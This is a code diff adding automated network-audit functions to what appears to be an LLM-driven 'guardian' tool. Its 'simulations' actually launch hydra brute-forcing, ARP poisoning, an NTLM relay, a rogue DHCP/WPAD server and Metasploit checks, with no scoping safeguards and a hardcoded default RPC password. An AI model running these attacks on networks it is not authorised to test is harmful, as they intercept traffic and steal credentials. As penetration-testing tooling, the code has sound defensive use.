+                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")
+
+    # --- get_local_ip_and_subnet Function ---
+    # Retrieves the local IP address and subnet in CIDR format for the specified interface.
+    def get_local_ip_and_subnet(self):
+        try:
+            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
+            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
+            if ip_match:
+                ip_with_cidr = ip_match.group(1)
+                ip_address, _ = ip_with_cidr.split('/')
+                return ip_address, ip_with_cidr
+            return None, None
+        except Exception: return None, None
+
+    # --- run_nmap_scan Function ---
+    # Executes a deep Nmap scan (`-sV`, `-sC`, `-O`) on a target IP range to discover
+    # hosts, open ports, services, and operating systems. Updates the global state with findings.
+    def run_nmap_scan(self, target_ip_range):
+        update_status(f"Running deep Nmap scan on {target_ip_range}...", "Discovery")
+        found_hosts = {}
+        try:
+            command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
+            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=NMAP_SCAN_TIMEOUT)
+            root = ET.fromstring(process.stdout)
+            for host in root.findall('host'):
+                ip = host.find("address[@addrtype='ipv4']").get('addr')
+                os_match = host.find("os/osmatch")
+                os_name = os_match.get('name') if os_match is not None else "Unknown"
+                ports = {}
+                for p in host.findall("ports/port"):
+                    service = p.find('service')
+                    if service is not None:
+                        ports[p.get('portid')] = {
+                            "service": service.get('name', 'unknown'),
+                            "product": service.get('product', 'unknown'),
+                            "version": service.get('version', 'unknown')
+                        }
+                found_hosts[ip] = {"os": os_name, "ports": ports, "vulnerabilities": {}, "credentials": {}, "shares": []}
+            guardian_state["analyzed_hosts"].update(found_hosts)
+            return found_hosts
+        except Exception as e:
+            update_status(f"Nmap scan failed: {e}", "Error")
+            return {}
+
+    # --- run_nikto_scan Function ---
+    # Performs a Nikto web vulnerability scan against a specified target IP and port.
+    # Logs the results to the SD card and updates the global state.
+    def run_nikto_scan(self, target_ip, port):
+        update_status(f"Running Nikto vulnerability scan on {target_ip}:{port}...", "Vulnerability Scan")
+        try:
+            command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
+            process = subprocess.run(command, capture_output=True, text=True, timeout=NIKTO_SCAN_TIMEOUT)
+            if target_ip in guardian_state["analyzed_hosts"]:
+                guardian_state["analyzed_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
+            log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
+            update_status(f"Nikto scan on {target_ip}:{port} complete.", "Vulnerability Scan")
+            return process.stdout
+        except Exception as e:
+            update_status(f"Nikto scan failed: {e}", "Error")
+            return None
+
+    # --- test_service_credentials Function ---
+    # Tests the strength of service logins (e.g., SSH, FTP) on a target device
+    # using `hydra` with a provided password list. Reports any weak credentials found.
+    def test_service_credentials(self, target_ip, port, service, password_list):
+        update_status(f"Starting credential strength test on {target_ip}:{port} ({service})...", "Credential Audit")
+        user_list = os.path.join(AI_MODEL_PATH, "common_users.txt")
+        pass_file = "/tmp/hydra_pass.txt"
+        with open(pass_file, "w") as f:
+            for p in password_list: f.write(p + "\n")
+        
+        try:
+            cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=HYDRA_TIMEOUT)
+            creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
+            if creds_match:
+                username = creds_match.group(1)
+                password = creds_match.group(2)
+                update_status(f"VULNERABILITY: Weak credentials found for {service} on {target_ip} - {username}:{password}", "Vulnerability Found")
+                if target_ip in guardian_state["analyzed_hosts"]:
+                    guardian_state["analyzed_hosts"][target_ip]["credentials"][service] = f"{username}:{password}"
+                return f"{username}:{password}"
+            else:
+                update_status(f"Credential test on {target_ip}:{port} completed. No weak credentials found.", "Credential Audit")
+                return None
+        except Exception as e:
+            update_status(f"Credential test failed: {e}", "Error")
+            return None
+        finally:
+            if os.path.exists(pass_file): os.remove(pass_file)
+
+    # --- enumerate_smb_shares Function ---
+    # Enumerates open Server Message Block (SMB) shares on a target IP using `smbclient`.
+    # This helps identify potential unauthorized data access points.
+    def enumerate_smb_shares(self, target_ip):
+        update_status(f"Enumerating SMB shares on {target_ip}...", "Discovery")
+        try:
+            cmd = ["smbclient", "-L", f"//{target_ip}", "-N"]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
+            if shares and target_ip in guardian_state["analyzed_hosts"]:
+                guardian_state["analyzed_hosts"][target_ip]["shares"] = shares
+                update_status(f"Found open SMB shares on {target_ip}: {shares}. Recommend restricting access.", "Vulnerability Found")
+            return shares
+        except Exception as e:
+            update_status(f"SMB enumeration failed: {e}", "Error")
+            return []
+
+    # --- simulate_arp_poisoning Function ---
+    # Simulates an ARP (Address Resolution Protocol) poisoning attack between a target IP
+    # and the gateway IP using `arpspoof`. This tests the network's defenses against
+    # Man-in-the-Middle (MITM) attacks.
+    def simulate_arp_poisoning(self, target_ip, gateway_ip):
+        update_status(f"Simulating ARP poisoning between {target_ip} and {gateway_ip} to test resilience...", "MITM Simulation")
+        try:
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+            target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            guardian_state["mitm_simulation"] = { "target_ip": target_ip, "gateway_ip": gateway_ip, "processes": [target_proc.pid, gw_proc.pid] }
+            update_status(f"ARP poisoning simulation active between {target_ip} and {gateway_ip}", "MITM Simulation")
+            return True
+        except Exception as e:
+            update_status(f"ARP poisoning simulation failed: {e}", "Error")
+            return False
+
+    # --- get_wan_ip Function ---
+    # Retrieves the public (WAN) IP address of the device by querying an external service.
+    def get_wan_ip(self):
+        update_status("Determining WAN IP address...", "Discovery")
+        try:
+            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True, check=True, timeout=10)
+            wan_ip = result.stdout.strip()
+            guardian_state["wan_ip"] = wan_ip
+            update_status(f"WAN IP: {wan_ip}", "Discovery")
+            return wan_ip
+        except Exception as e:
+            update_status(f"Failed to get WAN IP: {e}", "Error")
+            return None
+
+    # --- _load_audit_history Function (Private) ---
+    # Loads the audit history from a JSON file on the SD card.
+    def _load_audit_history(self):
+        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
+        try:
+            if os.path.exists(history_file):
+                with open(history_file, 'r') as f: return json.load(f)
+        except Exception: pass
+        return []
+
+    # --- _calculate_success_rates Function (Private) ---
+    # Calculates the success rates of different audit actions from the audit history.
+    def _calculate_success_rates(self, history):
+        if not history: return {}
+        success_counts, total_counts = {}, {}
+        for entry in history:
+            audit_type = entry.get('action')
+            if audit_type:
+                total_counts[audit_type] = total_counts.get(audit_type, 0) + 1
+                if entry.get('success'):
+                    success_counts[audit_type] = success_counts.get(audit_type, 0) + 1
+        return { t: (success_counts.get(t, 0) / total_counts[t]) for t in total_counts }
+
+    # --- simulate_ntlm_relay Function ---
+    # Simulates an NTLMv2 relay attack against specified targets using `impacket`.
+    # This tests the network's vulnerability to credential relaying.
+    def simulate_ntlm_relay(self, targets: list[str]):
+        update_status(f"Simulating NTLMv2 relay against {targets} to test for vulnerability", "Simulation")
+        try:
+            # The original implementation of this feature was broken due to incorrect impacket usage.
+            # Switching to a subprocess call to the ntlmrelayx.py script.
+            target_file = "/tmp/ntlm_targets.txt"
+            with open(target_file, "w") as f:
+                for target in targets:
+                    f.write(target + "\n")
+            
+            # Assuming ntlmrelayx.py is in a directory in the system's PATH
+            cmd = ["ntlmrelayx.py", "-tf", target_file, "-smb2support"]
+            
+            # Run in background
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            update_status(f"ntlmrelayx.py started in background against targets in {target_file}", "Simulation")
+            return True
+        except FileNotFoundError:
+            update_status("Error: ntlmrelayx.py not found in PATH. Cannot simulate NTLM relay.", "Error")
+            return False
+        except Exception as e:
+            update_status(f"Failed to start NTLM relay simulation: {e}", "Error")
+            return False
+
+    # --- simulate_dhcp_wpad_spoof Function ---
+    # Simulates a rogue DHCP server and WPAD (Web Proxy Auto-Discovery) spoofing attack.
+    # This tests the network's resilience against traffic redirection and proxy hijacking.
+    def simulate_dhcp_wpad_spoof(self, rogue_dns: str = None):
+        dns = rogue_dns or guardian_state.get("wan_ip", "8.8.8.8")
+        update_status("Simulating rogue DHCP & WPAD to test resilience", "Simulation")
+        dhcp_conf = f"default-lease-time 600;\nmax-lease-time 7200;\nauthoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {{\n  range 10.0.0.50 10.0.0.200;\n  option routers 10.0.0.1;\n  option domain-name-servers {dns};\n  option wpad.url \"http://{dns}/wpad.dat\";\n}}"
+        with open("/tmp/dhcpd.conf", "w") as f: f.write(dhcp_conf)
+        subprocess.Popen(["sudo", "dhcpd", "-cf", "/tmp/dhcpd.conf", self.interface])
+        update_status("Rogue DHCP simulation is up", "Simulation")
+        return True
+
+    # --- masscan_scan Function ---
+    # Performs a high-speed port scan using `masscan` on a given CIDR range.
+    # This is useful for quickly identifying open ports across a large network segment.
+    def masscan_scan(self, cidr: str, rate: int = 100000):
+        update_status(f"Running masscan on {cidr} @ {rate}pps", "Discovery (masscan)")
+        out = "/tmp/masscan.json"
+        cmd = ["masscan", cidr, "-p1-65535", f"--rate={rate}", "-oJ", out]
+        subprocess.run(cmd, check=True, timeout=60)
+        with open(out) as f: results = json.load(f)
+        update_status(f"masscan returned {len(results)} entries", "Discovery (masscan)")
+        return results
+
+# VulnerabilitySimulator Class
+class VulnerabilitySimulator:
+    """
+    Simulates various network exploits and vulnerabilities using the Metasploit Framework
+    and other tools. This module is designed for safe, non-destructive testing to
+    identify and confirm vulnerabilities.
+    """
+    # --- Constructor ---
+    # Initializes the simulator with an RPC password for the Metasploit RPC client.
+    def __init__(self, rpc_pass):
+        if not rpc_pass:
+            update_status("Metasploit RPC password not provided. Vulnerability simulator will be disabled.", "Warning")
+            self.client = None
+        else:
+            try:
+                self.client = MsfRpcClient(rpc_pass, timeout=30)
+            except Exception as e:
+                update_status(f"Failed to connect to Metasploit RPC: {e}. Simulator disabled.", "Error")
+                self.client = None
+    
+    # --- simulate_exploit Function ---
+    # Simulates a specific Metasploit exploit against a target IP.
+    # It uses `mod.check()` to safely test for vulnerability without actually exploiting.
+    def simulate_exploit(self, exploit_name, target_ip, payload="generic/shell_reverse_tcp"):
+        if not self.client:
+            update_status("Metasploit client not initialized. Skipping exploit simulation.", "Warning")
+            return False
+            
+        mod = self.client.modules.use('exploit', exploit_name)
+        mod['RHOSTS'] = target_ip
+        mod['PAYLOAD'] = payload
+        lhost, _ = LanAnalyzer(LAN_INTERFACE).get_local_ip_and_subnet()
+        if not lhost:
+            update_status(f"Could not determine local IP for exploit simulation against {target_ip}. Aborting.", "Error")
+            return False
+        mod['LHOST'] = lhost
+        # Use check_exploit to safely test, not execute
+        result = mod.check()
+        update_status(f"Metasploit check for {exploit_name} on {target_ip} returned: {result}", "Simulation")
+        
+        # Ensure result is a dictionary before checking the code
+        if isinstance(result, dict) and result.get('code') == 'vulnerable':
+            return True
+        return False
+
+    # --- simulate_known_vulnerabilities Function ---
+    # Placeholder for simulating known vulnerabilities. In a full implementation,
+    # this would map services and ports to specific non-destructive checks.
+    def simulate_known_vulnerabilities(self, target_ip, port, service):
+        update_status(f"Simulating known exploits on {target_ip}:{port} ({service})...", "Simulation")
+        # This would contain logic to map services to non-destructive checks
+        return False # Placeholder
+
+    # --- self_update Function ---
+    # Performs a self-update of the Guardian's code and tools.
+    # It pulls the latest code from Git and updates/installs necessary packages
+    # like Metasploit, masscan, and bettercap.
+    def self_update(self):
+        update_status("Performing self-update...", "Update")
+        try:
+            # Use relative path for git pull
+            subprocess.run(['git', 'pull'], check=True, timeout=60)
+            subprocess.run(['sudo','apt','update'], check=True, timeout=120)
+            subprocess.run(['sudo','apt','install','-y', 'metasploit-framework','masscan','bettercap'], check=True, timeout=300)
+            update_status("Self-update complete.", "Update")
+        except Exception as e:
+            update_status(f"Self-update failed: {e}", "Error")
+
 # --- Web Dashboard (Flask) & Main Entry Point ---
 from flask import Flask, render_template_string, jsonify, request
 
@@ -1164,14 +1437,20 @@ def handle_command():
     return jsonify({"status": "Invalid command or state"}), 400
 
 if __name__ == "__main__":
+    # It's better to get sensitive info from env vars or a config file,
+    # but for this fix, we'll define it here.
+    MSF_RPC_PASSWORD = os.environ.get("MSF_RPC_PASSWORD", "msfadmin")
+
     load_state()
     llm_client = StackFlowClient(LLM_ZMQ_ENDPOINT)
     
-    if not llm_client.connect() or not llm_client.setup_llm():
-        update_status("Critical: Unable to initialize LLM630. Exiting.", "Error")
+    # New initialization sequence: reset the system, then set up the LLM.
+    if not llm_client.reset_system() or not llm_client.setup_llm():
+        update_status("Critical: Unable to initialize LLM630. Check StackFlow service. Exiting.", "Error")
+        llm_client.close()
         exit(1)
         
-    ai_orchestrator = AIAnalysisOrchestrator(llm_client)
+    ai_orchestrator = AIAnalysisOrchestrator(llm_client, rpc_pass=MSF_RPC_PASSWORD)
     
     update_status("Starting Web Dashboard...", "UI Init")
     web_app.run(host='0.0.0.0', port=8081, debug=False)
